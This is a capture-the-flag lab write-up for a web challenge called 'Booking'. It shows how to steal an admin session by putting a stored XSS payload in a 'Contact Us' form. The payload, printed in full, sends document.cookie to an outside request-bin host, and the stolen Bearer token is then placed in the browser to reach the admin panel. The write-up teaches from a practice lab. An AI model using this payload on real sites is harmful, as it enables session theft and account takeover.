#### NOTE: The challenge is a bit buggy and will produce the final flag some times, and in other times you will have to repeat the cookie manipulation part multiple times
# Booking
## Challenge Description:
On your last vacation day in the "Wild Moose Hostel", the hostel's manager heard you discussing your full-time job as a penetration tester with other guests.<br>
She offered you to stay an additional night, free of charge, in exchange for assistance regarding a suspicion they have based on a security issue.<br>
According to her, they noticed several logins to their admin accounts at late hours, which none of the actual admins could confirm as valid.<br>

#### Your goals<br>
☛ Find the vulnerable functionality on the web application.<br>
☛ Find a way to compromise an admin account.<br>
☛ Gain access to the hostel's admin panel.<br>


## Process:


<p align="center">
        <kbd align="center">
          <img src="Images/Booking_01.png"/>
        </kbd> 
</p><br>

Sign up and create an account. The credentials don't matter all that much, just remember them. <br>

<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_02.png"/>
        </kbd> 
</p><br>
After creating an account, sign in and go to 'My Moose'.<br>
Scroll down to the 'Contact Us' section.<br>
<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_03.png"/>
        </kbd> 
</p><br><br>
Go to this site https://pipedream.com/requestbin in order to create a public bin to continue the process<br> 
<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_04.png"/>
        </kbd> 
</p><br><br>
Copy the endpoint link <br>
<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_05.png"/>
        </kbd> 
</p><br><br>
Go to this site https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md that contains Reflected XSS injection scripts for stealing cookies and use the 3rd script<br>
<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_06.png"/>
        </kbd> 
</p><br><br>
In the 'Contact Us' section, place the script with the endpoint link inside of it, for example: <br>

#### <img src=x onerror=this.src='https://enqewxf0bhc69.x.pipedream.net/?'+document.cookie;>
<br>
<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_07.png"/>
        </kbd> 
</p><br><br>
Now you should return to the public bin page and wait a few moments for the requests to appear. <br>
<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_08.png"/>
        </kbd> 
</p><br><br>
What you will need now is the Bearer token that is highlighted in the picture. Double click it and copy. <br>
Return to the Moose site and open up the 'Cookie Editor' extension, and replace the value section with the Bearer token that we just copied. Save it and refresh the page<br>
<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_09.png"/>
        </kbd> 
</p><br><br>
Now you should see a new yellow button next to 'My Moose' that says 'Admin Panel'. <br>
<br><p align="center">
        <kbd align="center">
          <img src="Images/Booking_10.png"/>
        </kbd> 
</p><br><br>
Now this is the buggy part. Enter the admin panel and you will either see a blank page, or you will see the flag. <br>
If you don't see the flag, repeat the login part and redo the cookie edit. Repeat until it works

